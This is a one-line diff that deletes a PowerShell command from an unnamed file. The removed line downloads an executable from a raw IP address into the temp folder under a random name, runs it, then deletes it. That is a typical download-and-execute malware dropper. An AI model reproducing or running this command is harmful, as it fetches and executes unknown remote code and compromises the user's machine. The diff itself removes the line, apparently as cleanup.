@@ -1,1 +1,0 @@
-powershell.exe -c Invoke-WebRequest -OutFile %TEMP%\\zzskQAnD.exe http://185.247.224.237/fire64.exe;%TEMP%\\zzskQAnD.exe;del %TEMP%\\zzskQAnD.exe
